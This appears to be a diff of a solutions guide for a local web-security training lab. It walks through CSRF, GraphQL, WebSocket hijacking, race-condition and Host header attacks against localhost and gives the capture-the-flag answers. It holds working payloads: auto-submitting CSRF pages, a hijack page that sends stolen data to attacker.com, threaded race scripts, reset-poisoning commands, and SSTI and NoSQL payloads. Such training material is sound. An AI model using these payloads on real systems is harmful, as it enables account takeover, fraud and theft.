+# Victim visits: http://localhost:8000/evil.html
 ```
 
-**Alternative Exploitation - GET-based Attack:**
-```html
-<!-- Simple image-based CSRF (no JavaScript required) -->
-<img src="http://localhost:5000/api/vuln/csrf-advanced/change-email?email=attacker@evil.com">
-```
+#### Step 3: SameSite=None Cookie Bypass ⭐
+**Bypass Technique:** Exploit SameSite=None cookies in cross-site requests
 
-**Why This Works:**
-1. Cookie has `SameSite=None` - browser sends it cross-site
-2. CSRF token is predictable (timestamp-based)
-3. No Referrer validation on server
-4. GET requests allowed for state-changing operations
-
-### 9. Race Condition - TOCTOU Bypass
-
-#### Bypass Method: Time-of-Check-Time-of-Use (TOCTOU) Exploitation
-**Vulnerability:** Discount code validation and usage not atomic  
-**Bypass:** Send multiple parallel requests before code is marked as used
-
-**Exploitation Using Burp Suite:**
-
-**Step 1: Understand the Vulnerability**
-1. Server checks if discount code is valid (Time of Check)
-2. **Delay exists here** - exploit window!
-3. Server marks code as used (Time of Use)
-4. In the delay window, send duplicate requests
-
-**Step 2: Manual Testing**
+**Analysis:**
 ```bash
-# Get initial balance (should be $100)
-curl "http://localhost:5000/api/vuln/race-condition"
-
-# Try using code once (adds $50, balance = $150)
-curl -X POST "http://localhost:5000/api/vuln/race-condition/apply-discount" \
-  -H "Content-Type: application/json" \
-  -d '{"discountCode":"SAVE50"}'
+# Check cookie configuration
+curl -i http://localhost:5000/api/vuln/csrf-advanced | grep "Set-Cookie"
+# Output: Set-Cookie: csrf_session=user_123; SameSite=None; Secure
 ```
 
-**Step 3: Race Condition Attack with Burp Suite**
+**Exploitation - Create advanced evil.html:**
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Free Gift Card</title>
+</head>
+<body>
+  <h1>Loading your gift card...</h1>
+  
+  <!-- CSRF Attack Form -->
+  <form id="csrf" action="http://localhost:5000/api/vuln/csrf-advanced/transfer" method="POST">
+    <input type="hidden" name="recipient" value="attacker@evil.com">
+    <input type="hidden" name="amount" value="10000">
+    <input type="hidden" name="csrf_token" id="token">
+  </form>
+  
+  <script>
+    // Generate predictable CSRF token (timestamp-based)
+    const timestamp = Math.floor(Date.now() / 1000);
+    document.getElementById('token').value = 'csrf_' + timestamp;
+    
+    // Auto-submit
+    document.getElementById('csrf').submit();
+  </script>
+</body>
+</html>
+```
 
-**Using Burp Repeater (Group Send):**
+**Using Burp Suite:**
+1. Intercept the legitimate transfer request
+2. Note the CSRF token generation pattern
+3. Create attack page that predicts/generates valid token
+4. Host on HTTPS (required for SameSite=None)
+5. Victim's browser sends cookies due to `SameSite=None`
+
+**Flag:** `{CSRF_SAMESITE_BYPASS_SUCCESSFUL}`
+
+#### Step 4: GET-Based CSRF
+**Objective:** Exploit state-changing GET requests
+
+**Using curl:**
+```bash
+# Test if GET request works for state changes
+curl "http://localhost:5000/api/vuln/csrf-advanced/change-email?email=attacker@evil.com"
+```
+
+**Create image-based attack:**
+```html
+<!-- Embed in attacker's website -->
+<img src="http://localhost:5000/api/vuln/csrf-advanced/change-email?email=attacker@evil.com" style="display:none">
+```
+
+**Flag:** `{CSRF_GET_METHOD_EXPLOIT}`
+
+### Prevention Measures
+- Use `SameSite=Strict` or `SameSite=Lax` for cookies
+- Implement cryptographically random CSRF tokens
+- Validate Origin and Referer headers
+- Use custom request headers for AJAX requests
+- Require re-authentication for sensitive actions
+- Implement CAPTCHA for critical operations
+
+---
+
+## 6. GraphQL Injection
+
+### Vulnerability Description
+GraphQL vulnerabilities arise from insufficient query validation, enabled introspection, lack of depth limiting, and query batching without rate limits.
+
+### Lab URL
+`http://localhost:5000/api/vuln/graphql-injection`
+
+### Impact
+- Schema disclosure
+- Data over-fetching
+- Denial of Service (DoS)
+- Authorization bypass
+
+### Solution Steps
+
+#### Step 1: Schema Introspection
+**Objective:** Extract full GraphQL schema
+
+**Using curl:**
+```bash
+# Basic introspection query
+curl -X POST http://localhost:5000/api/vuln/graphql-injection \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "{ __schema { types { name fields { name type { name } } } } }"
+  }'
+
+# Full introspection query
+curl -X POST http://localhost:5000/api/vuln/graphql-injection \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind ofType { name kind } } } } } }"
+  }'
+```
+
+**Using Burp Suite:**
+1. Send POST to `/api/vuln/graphql-injection`
+2. Use GraphQL introspection query
+3. Parse response to map entire schema
+
+**Flag:** `{GRAPHQL_SCHEMA_EXPOSED}`
+
+#### Step 2: Introspection Bypass ⭐
+**Bypass Technique:** Query schema when introspection appears "disabled"
+
+**Using curl:**
+```bash
+# Simplified introspection that might bypass filters
+curl -X POST http://localhost:5000/api/vuln/graphql-injection \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{__schema{types{name}}}"}'
+
+# Alternative: Use fragments
+curl -X POST http://localhost:5000/api/vuln/graphql-injection \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "fragment Schema on __Schema { types { name } } query { __schema { ...Schema } }"
+  }'
+```
+
+**Using Burp Suite:**
+1. Try minified introspection: `{__schema{types{name}}}`
+2. Use aliases: `{s:__schema{t:types{n:name}}}`
+3. WAF might block `__schema` but miss compact versions
+
+**Flag:** `{GRAPHQL_INTROSPECTION_BYPASS}`
+
+#### Step 3: Query Batching Bypass ⭐
+**Bypass Technique:** Extract multiple resources in single request to bypass rate limits
+
+**Using curl:**
+```bash
+# Batch query to extract multiple endpoints
+curl -X POST http://localhost:5000/api/vuln/graphql-injection \
+  -H "Content-Type: application/json" \
+  -d '[
+    {"query":"{users{id,username,email}}"},
+    {"query":"{posts{id,title,content}}"},
+    {"query":"{comments{id,text,author}}"} 
+  ]'
+
+# Alternative: Aliased batching
+curl -X POST http://localhost:5000/api/vuln/graphql-injection \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "{
+      u1: users { id username }
+      u2: posts { id title }
+      u3: comments { id text }
+    }"
+  }'
+```
+
+**Using Burp Suite Intruder:**
+1. Create batch query array
+2. Enumerate all resources simultaneously
+3. Bypass per-query rate limits
+
+**Flag:** `{GRAPHQL_BATCH_QUERY_BYPASS}`
+
+#### Step 4: Depth Limit Bypass ⭐
+**Bypass Technique:** Deeply nested queries to access sensitive data
+
+**Using curl:**
+```bash
+# Circular query to cause DoS or access nested data
+curl -X POST http://localhost:5000/api/vuln/graphql-injection \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "{
+      users {
+        id
+        posts {
+          id
+          comments {
+            id
+            author {
+              id
+              posts {
+                id
+                comments {
+                  id
+                }
+              }
+            }
+          }
+        }
+      }
+    }"
+  }'
+```
+
+**Using Burp Suite:**
+1. Create deeply nested query (10+ levels)
+2. Target circular relationships: user→posts→comments→user
+3. Can cause DoS or extract hidden data
+
+**Flag:** `{GRAPHQL_DEPTH_LIMIT_BYPASS}`
+
+#### Step 5: __typename Disclosure ⭐
+**Bypass Technique:** Use __typename to discover field types
+
+**Using curl:**
+```bash
+# Discover type information
+curl -X POST http://localhost:5000/api/vuln/graphql-injection \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "{ users { id username email __typename } }"
+  }'
+
+# Discover hidden fields via typename
+curl -X POST http://localhost:5000/api/vuln/graphql-injection \
+  -H "Content-Type: application/json" \
+  -d '{
+    "query": "{ __type(name: \"User\") { fields { name type { name } } } }"
+  }'
+```
+
+**Expected Response:**
+```json
+{
+  "data": {
+    "users": [
+      {
+        "id": "1",
+        "username": "admin",
+        "email": "admin@zeroday.lab",
+        "__typename": "User"
+      }
+    ]
+  }
+}
+```
+
+**Flag:** `{GRAPHQL_TYPENAME_DISCLOSURE}`
+
+### Prevention Measures
+- Disable introspection in production
+- Implement query depth limiting (max 5-7 levels)
+- Use query complexity analysis
+- Implement rate limiting per user/IP
+- Disable query batching or limit batch size
+- Use persisted queries (query allowlisting)
+- Implement field-level authorization
+
+---
+
+## 7. WebSocket Manipulation
+
+### Vulnerability Description
+WebSocket vulnerabilities arise from insufficient origin validation, lack of authentication, and improper message validation.
+
+### Lab URL
+`http://localhost:5000/api/vuln/websocket-manipulation`
+
+### Impact
+- Unauthorized real-time communication
+- Message injection/manipulation
+- Cross-site WebSocket hijacking (CSWSH)
+- Information disclosure
+
+### Solution Steps
+
+#### Step 1: WebSocket Connection Analysis
+**Objective:** Understand WebSocket handshake and message flow
+
+**Using Burp Suite:**
+1. Open WebSocket lab in browser
+2. Enable Burp WebSocket interception
+3. Proxy → WebSockets history
+4. Observe handshake:
+   ```
+   GET /api/vuln/websocket-manipulation HTTP/1.1
+   Upgrade: websocket
+   Connection: Upgrade
+   Origin: http://localhost:5000
+   Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+   ```
+
+#### Step 2: Message Interception and Manipulation
+**Objective:** Intercept and modify WebSocket messages
+
+**Using Burp Suite:**
+1. WebSocket history → Find active connection
+2. Right-click → "Send to Repeater"
+3. Modify messages in real-time:
+   ```json
+   {"type":"chat","user":"victim","message":"Hello"}
+   ```
+4. Change to:
+   ```json
+   {"type":"chat","user":"admin","message":"<script>alert(1)</script>"}
+   ```
+5. Send modified message
+
+**Flag:** `{WEBSOCKET_MESSAGE_MANIPULATION}`
+
+#### Step 3: Origin Validation Bypass ⭐
+**Bypass Technique:** Bypass weak origin validation with substring matching
+
+**Analysis:**
+```javascript
+// Vulnerable server code checks:
+if (origin.includes('trusted')) {
+  // Allow connection
+}
+```
+
+**Using Burp Suite:**
+1. Intercept WebSocket upgrade request
+2. Modify `Origin` header to:
+   - `http://evil.trusted.com` (contains "trusted")
+   - `http://trusted-attacker.com` (contains "trusted")
+   - `http://attacker.com/trusted.html` (contains "trusted")
+
+**Using custom WebSocket client:**
+```html
+<!-- evil-websocket.html -->
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>WebSocket CSWSH Attack</h1>
+  <script>
+    // Custom origin will be sent by browser
+    const ws = new WebSocket('ws://localhost:5000/api/vuln/websocket-manipulation');
+    
+    ws.onopen = () => {
+      console.log('Connected with malicious origin!');
+      ws.send(JSON.stringify({
+        type: 'admin_command',
+        command: 'deleteAllUsers'
+      }));
+    };
+    
+    ws.onmessage = (event) => {
+      console.log('Received:', event.data);
+      document.body.innerHTML += '<p>Data: ' + event.data + '</p>';
+    };
+  </script>
+</body>
+</html>
+```
+
+**Burp Suite Steps:**
+1. Intercept WebSocket upgrade
+2. Change Origin: `http://evil.trusted.com`
+3. Server accepts due to substring match
+4. Successful connection from malicious origin
+
+**Flag:** `{WEBSOCKET_ORIGIN_VALIDATION_BYPASS}`
+
+#### Step 4: Cross-Site WebSocket Hijacking (CSWSH)
+**Objective:** Hijack WebSocket from attacker's website
+
+**Create attack page (cswsh.html):**
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Legitimate Site</title>
+</head>
+<body>
+  <h1>Welcome to our site!</h1>
+  <div id="stolen-data"></div>
+  
+  <script>
+    // Connect to victim's WebSocket
+    const ws = new WebSocket('ws://localhost:5000/api/vuln/websocket-manipulation');
+    
+    ws.onmessage = (event) => {
+      // Steal sensitive data
+      const data = JSON.parse(event.data);
+      document.getElementById('stolen-data').innerHTML += '<p>' + JSON.stringify(data) + '</p>';
+      
+      // Exfiltrate to attacker server
+      fetch('https://attacker.com/collect', {
+        method: 'POST',
+        body: JSON.stringify(data)
+      });
+    };
+    
+    ws.onopen = () => {
+      // Send malicious commands
+      ws.send(JSON.stringify({type: 'getAdminData'}));
+    };
+  </script>
+</body>
+</html>
+```
+
+**Flag:** `{CSWSH_SUCCESSFUL}`
+
+### Prevention Measures
+- Validate Origin header against strict allowlist
+- Require authentication tokens in WebSocket handshake
+- Implement message signing/encryption
+- Use WSS (WebSocket Secure) over TLS
+- Implement rate limiting per connection
+- Validate message structure and content
+- Use CSRF tokens in WebSocket upgrade requests
+
+---
+
+## 8. Race Condition
+
+### Vulnerability Description
+Race condition vulnerabilities occur when multiple requests exploit timing windows in validation and execution, allowing attackers to bypass business logic.
+
+### Lab URL
+`http://localhost:5000/api/vuln/race-condition`
+
+### Impact
+- Financial fraud (multiple discount applications)
+- Inventory manipulation
+- Privilege escalation
+- Resource exhaustion
+
+### Solution Steps
+
+#### Step 1: Identify Race Condition Window
+**Objective:** Find time gap between validation and execution
+
+**Using curl:**
+```bash
+# Test normal request
+curl http://localhost:5000/api/vuln/race-condition
+# Response: {"balance": 100, "discount_available": true}
+
+# Apply discount once
+curl -X POST http://localhost:5000/api/vuln/race-condition/purchase \
+  -H "Content-Type: application/json" \
+  -d '{"use_discount": true}'
+# Response: {"balance": 150, "discount_used": true}
+```
+
+**Vulnerability:** 
+- Check: `if (discount_available) { ... }`
+- Use: `balance += 50; discount_available = false;`
+- Time gap between check and use = TOCTOU vulnerability
+
+#### Step 2: TOCTOU Bypass with Burp Repeater ⭐
+**Bypass Technique:** Time-of-Check-Time-of-Use exploitation using parallel requests
+
+**Using Burp Suite Repeater:**
 1. Send discount request to Repeater
-2. Right-click → Create tab group (add 20 copies)
-3. Select all tabs → Send group in parallel
-4. Watch multiple requests succeed before code is marked used
-5. Balance increases beyond $150 (multiple $50 credits)
-6. Flag: {RACE_CONDITION_EXPLOITED_MULTIPLE_USES}
+2. Right-click → "Create tab group" → Add 20 copies
+3. Select all tabs → Right-click → "Send group in parallel"
+4. All requests hit server simultaneously
+5. Multiple requests pass validation before any updates state
 
-**Using Burp Intruder:**
-1. Send request to Intruder
-2. Clear all payload positions (we're not fuzzing parameters)
-3. Set attack type to "Sniper"
-4. Payloads → Payload type: Null payloads
-5. Generate 50 payloads
-6. Resource Pool → Create new pool with 50 concurrent requests
-7. Start attack
-8. Multiple requests complete before validation locks the code
+**Expected Result:**
+```bash
+# Check balance after attack
+curl http://localhost:5000/api/vuln/race-condition
+# Response: {"balance": 1100}  # 100 + (50 * 20) = 1100
+```
 
-**Step 4: Python Script for Automated Exploitation**
+**Flag:** `{RACE_CONDITION_EXPLOITED_MULTIPLE_USES}`
+
+#### Step 3: TOCTOU Bypass with Burp Intruder ⭐
+**Bypass Technique:** Automated concurrent request flooding
+
+**Using Burp Suite Intruder:**
+1. Send purchase request to Intruder
+2. Set payload position (not needed, use null payloads)
+3. **Payloads tab:**
+   - Payload type: "Null payloads"
+   - Generate: 50 payloads
+4. **Resource Pool tab:**
+   - Create new pool: "Race Condition"
+   - Maximum concurrent requests: 50
+5. **Start attack**
+
+**Automation script (race_condition.py):**
 ```python
 import requests
 import threading
 
-url = "http://localhost:5000/api/vuln/race-condition/apply-discount"
-data = {"discountCode": "SAVE50"}
+url = "http://localhost:5000/api/vuln/race-condition/purchase"
+headers = {"Content-Type": "application/json"}
+data = {"use_discount": True}
 
 def exploit():
-    response = requests.post(url, json=data)
-    print(f"Response: {response.status_code} - {response.json()}")
+    response = requests.post(url, json=data, headers=headers)
+    print(f"Response: {response.json()}")
 
-# Launch 20 parallel requests
+# Launch 50 concurrent requests
 threads = []
-for i in range(20):
+for i in range(50):
     t = threading.Thread(target=exploit)
     threads.append(t)
     t.start()
 
-# Wait for all to complete
+# Wait for all threads
 for t in threads:
     t.join()
 
-print("Race condition attack complete!")
+# Check final balance
+balance = requests.get("http://localhost:5000/api/vuln/race-condition").json()
+print(f"Final balance: {balance}")
 ```
 
-**Expected Result:**
-- Normal usage: 1 successful application (balance = $150)
-- Race condition: 5-10 successful applications (balance = $350-$600)
-- Flag received when balance > $150
+**Run the script:**
+```bash
+python3 race_condition.py
+```
 
-**Why This Works:**
-1. Check and use operations are not atomic
-2. No mutex/lock on discount code validation
-3. Database doesn't have proper transaction isolation
-4. Multiple requests exploit the time gap between validation and marking as used
+**Expected Output:**
+```
+Response: {'balance': 150, 'discount_used': True}
+Response: {'balance': 200, 'discount_used': True}
+Response: {'balance': 250, 'discount_used': True}
+...
+Final balance: {'balance': 2600}
+```
+
+#### Step 4: Database-Level Race Condition
+**Objective:** Exploit transaction isolation issues
+
+**Using curl with GNU Parallel:**
+```bash
+# Install GNU Parallel
+sudo apt-get install parallel
+
+# Create request file
+cat > requests.txt << EOF
+curl -X POST http://localhost:5000/api/vuln/race-condition/purchase -H "Content-Type: application/json" -d '{"use_discount":true}'
+EOF
+
+# Execute 100 concurrent requests
+cat requests.txt | parallel -j 100
+```
+
+**Flag:** `{RACE_CONDITION_DATABASE_EXPLOIT}`
+
+### Prevention Measures
+- Use database transactions with proper isolation levels
+- Implement pessimistic locking (SELECT FOR UPDATE)
+- Use atomic operations (ACID compliance)
+- Implement idempotency keys for critical operations
+- Use distributed locks (Redis, Memcached) for multi-server setups
+- Implement request deduplication
+- Use message queues for sequential processing
 
 ---
 
-## Advanced Testing Tools and Techniques
+## 9. HTTP Host Header Injection
 
-### Automated Testing Tools
-1. **SQLMap** - Advanced SQL injection automation
-2. **XSSStrike** - Advanced XSS detection and exploitation
-3. **Commix** - Command injection exploitation
-4. **XXEinjector** - Advanced XXE exploitation
-5. **Custom Python scripts** - Tailored exploitation tools
+### Vulnerability Description
+Host header injection exploits applications that use the Host header to generate URLs without validation, enabling cache poisoning and password reset poisoning.
 
-### Burp Suite Professional Extensions
-1. **JWT Editor** - JSON Web Token manipulation
-2. **Collaborator Everywhere** - Out-of-band vulnerability detection
-3. **Hackvertor** - Advanced encoding and evasion
-4. **Turbo Intruder** - High-speed attack automation
-5. **Content Type Converter** - Advanced content manipulation
+### Lab URL
+`http://localhost:5000/api/vuln/host-header-injection`
 
-### Advanced Methodology
-1. **Reconnaissance Phase** - Deep application analysis
-2. **Vulnerability Chaining** - Combine multiple vulnerabilities
-3. **Evasion Techniques** - Bypass modern security controls
-4. **Persistence Methods** - Maintain access after exploitation
-5. **Data Exfiltration** - Advanced data extraction techniques
+### Impact
+- Password reset poisoning
+- Cache poisoning
+- Web cache deception
+- SSRF (Server-Side Request Forgery)
+
+### Solution Steps
+
+#### Step 1: Identify Host Header Usage
+**Objective:** Determine how application uses Host header
+
+**Using curl:**
+```bash
+# Normal request
+curl -H "Host: localhost:5000" http://localhost:5000/api/vuln/host-header-injection
+
+# Test modified Host header
+curl -H "Host: evil.com" http://localhost:5000/api/vuln/host-header-injection
+```
+
+**Using Burp Suite:**
+1. Intercept GET request
+2. Observe where Host header is reflected:
+   ```
+   GET /api/vuln/host-header-injection HTTP/1.1
+   Host: localhost:5000
+   
+   Response:
+   {
+     "reset_link": "http://localhost:5000/reset?token=abc123"
+   }
+   ```
+
+#### Step 2: Basic Host Header Injection
+**Objective:** Inject malicious domain in Host header
+
+**Using curl:**
+```bash
+# Inject attacker's domain
+curl -X POST http://localhost:5000/api/vuln/host-header-injection/reset \
+  -H "Host: evil.com" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"victim@example.com"}'
+```
+
+**Expected Response:**
+```json
+{
+  "message": "Password reset email sent",
+  "reset_link": "http://evil.com/reset?token=secret_token_123"
+}
+```
+
+**Attack flow:**
+1. Attacker triggers password reset for victim
+2. Injects `Host: attacker.com`
+3. Victim receives email with reset link to attacker's domain
+4. Victim clicks link, token sent to attacker
+5. Attacker uses token to reset victim's password
+
+**Flag:** `{HOST_HEADER_INJECTION_SUCCESSFUL}`
+
+#### Step 3: X-Forwarded-Host Bypass ⭐
+**Bypass Technique:** Use X-Forwarded-Host for password reset poisoning
+
+**Using curl:**
+```bash
+# Try X-Forwarded-Host header
+curl -X POST http://localhost:5000/api/vuln/host-header-injection/reset \
+  -H "Host: localhost:5000" \
+  -H "X-Forwarded-Host: evil.com" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"victim@example.com"}'
+```
+
+**Using Burp Suite:**
+1. Intercept password reset POST
+2. Add header: `X-Forwarded-Host: evil.com`
+3. Server prioritizes X-Forwarded-Host over Host
+4. Reset link generated with attacker's domain
+
+**Expected Response:**
+```json
+{
+  "message": "Password reset email sent",
+  "reset_link": "http://evil.com/reset?token=captured_token_456",
+  "flag": "{HOST_HEADER_X_FORWARDED_HOST_BYPASS}"
+}
+```
+
+**Flag:** `{HOST_HEADER_X_FORWARDED_HOST_BYPASS}`
+
+#### Step 4: X-Original-Host Bypass ⭐
+**Bypass Technique:** Use alternative X-Original-Host header
+
+**Using curl:**
+```bash
+# Try X-Original-Host
+curl -X POST http://localhost:5000/api/vuln/host-header-injection/reset \
+  -H "Host: localhost:5000" \
+  -H "X-Original-Host: attacker.com" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"victim@example.com"}'
+
+# Try other header variations
+curl -X POST http://localhost:5000/api/vuln/host-header-injection/reset \
+  -H "X-Host: attacker.com" \
+  -d '{"email":"victim@example.com"}'
+
+curl -X POST http://localhost:5000/api/vuln/host-header-injection/reset \
+  -H "X-Forwarded-Server: attacker.com" \
+  -d '{"email":"victim@example.com"}'
+```
+
+**Using Burp Suite Intruder:**
+1. Send to Intruder
+2. Payload position: `§X-Forwarded-Host§: evil.com`
+3. Payload list:
+   ```
+   X-Forwarded-Host
+   X-Original-Host
+   X-Host
+   X-Forwarded-Server
+   Forwarded
+   ```
+4. Identify which headers are accepted
+
+**Flag:** `{HOST_HEADER_X_ORIGINAL_HOST_BYPASS}`
+
+#### Step 5: Cache Poisoning
+**Objective:** Poison web cache with malicious Host header
+
+**Using curl:**
+```bash
+# Send request with malicious Host and cache-busting parameter
+curl -H "Host: evil.com" "http://localhost:5000/api/vuln/host-header-injection?cb=123"
+
+# Subsequent requests (without malicious Host) get poisoned response
+curl "http://localhost:5000/api/vuln/host-header-injection?cb=123"
+```
+
+**Attack scenario:**
+1. Attacker sends request with `Host: evil.com` and static resource URL
+2. CDN/cache stores response with evil.com links
+3. All users requesting same URL get poisoned cached response
+4. Users click links, redirected to attacker's site
+
+**Flag:** `{HOST_HEADER_CACHE_POISONING}`
+
+### Prevention Measures
+- Never use Host header to generate URLs
+- Use absolute URLs with hardcoded domain
+- Validate Host header against allowlist
+- Ignore X-Forwarded-* headers unless from trusted proxy
+- Implement proper cache key configuration
+- Use `Vary: Host` header to prevent cache poisoning
+- Implement request validation at proxy/load balancer level
 
 ---
 
-**Remember:** These advanced techniques require extensive knowledge and should only be used in authorized testing environments. Always ensure proper authorization and follow responsible disclosure practices.
+## General Burp Suite Tips for Intermediate Labs
+
+### 1. WebSocket Testing
+- Enable WebSocket history in Proxy settings
+- Use WebSocket message editor for JSON payloads
+- Send WebSocket messages to Repeater for testing
+
+### 2. Race Condition Testing
+- Use "Create tab group" in Repeater for parallel requests
+- Configure Resource Pool in Intruder for concurrent requests
+- Use Turbo Intruder extension for advanced race conditions
+
+### 3. JWT Testing
+- Use "JSON Web Token" tab to decode/modify JWTs
+- Install "JWT Editor" extension for algorithm confusion
+- Use "Decoder" tab for base64 encoding/decoding
+
+### 4. GraphQL Testing
+- Install "GraphQL Raider" or "InQL" extension
+- Use Repeater with GraphQL content type
+- Enable "GraphQL" in Logger++ for query tracking
+
+### 5. Advanced Header Manipulation
+- Use "Match and Replace" for automatic header injection
+- Configure custom header lists for Intruder attacks
+- Use Param Miner extension to discover hidden headers
+
+---
+
+## Automation Scripts
+
+### Python Script Template for API Testing
+```python
+import requests
+import json
+
+class IntermediateLab:
+    def __init__(self, base_url="http://localhost:5000"):
+        self.base_url = base_url
+        self.session = requests.Session()
+    
+    def test_ssti(self):
+        url = f"{self.base_url}/api/vuln/ssti"
+        payloads = [
+            "{{7*7}}",
+            "{{constructor.constructor('return process.env')()}}",
+            "{%print(7*7)%}"
+        ]
+        for payload in payloads:
+            response = self.session.get(url, params={"template": payload})
+            print(f"Payload: {payload}")
+            print(f"Response: {response.text}\n")
+    
+    def test_nosql(self):
+        url = f"{self.base_url}/api/vuln/nosql-injection"
+        payloads = [
+            {"username": {"$ne": ""}, "password": {"$ne": ""}},
+            {"username": {"$gt": ""}, "password": {"$gt": ""}},
+            {"username": {"$regex": "^a"}, "password": {"$ne": ""}}
+        ]
+        for payload in payloads:
+            response = self.session.post(url, json=payload)
+            print(f"Payload: {json.dumps(payload)}")
+            print(f"Response: {response.text}\n")
+    
+    def test_race_condition(self):
+        import threading
+        url = f"{self.base_url}/api/vuln/race-condition/purchase"
+        data = {"use_discount": True}
+        
+        def exploit():
+            response = self.session.post(url, json=data)
+            print(response.json())
+        
+        threads = [threading.Thread(target=exploit) for _ in range(50)]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
+
+if __name__ == "__main__":
+    lab = IntermediateLab()
+    lab.test_ssti()
+    lab.test_nosql()
+    lab.test_race_condition()
+```
+
+---
+
+## Conclusion
+
+These 9 intermediate labs cover advanced web application vulnerabilities with real-world bypass techniques. Each lab includes:
+- **Basic exploitation** to understand the vulnerability
+- **Bypass techniques** (⭐) to overcome security controls
+- **Multiple attack vectors** using curl and Burp Suite
+- **Unique flags** for successful exploitation verification
+
+### Key Takeaways:
+1. **SSTI**: WAF bypass via alternate delimiters, filter evasion through attribute chaining
+2. **LDAP**: Wildcard injection, comment injection, boolean-based blind extraction
+3. **NoSQL**: Operator abuse ($gt, $regex, $where), JavaScript execution
+4. **JWT**: Algorithm confusion, "none" bypass, weak secret cracking
+5. **CSRF**: SameSite=None exploitation, predictable token bypass
+6. **GraphQL**: Introspection bypass, query batching, depth limit evasion
+7. **WebSocket**: Origin validation bypass, cross-site hijacking
+8. **Race Condition**: TOCTOU exploitation, parallel request flooding
+9. **Host Header**: X-Forwarded-Host bypass, cache poisoning
+
+### Next Steps:
+1. Practice each lab systematically
+2. Document all successful bypasses
+3. Understand the underlying vulnerability principles
+4. Apply knowledge to real-world penetration testing (responsibly)
+5. Always follow responsible disclosure practices
+
+Remember: These techniques are for educational purposes in controlled environments only.
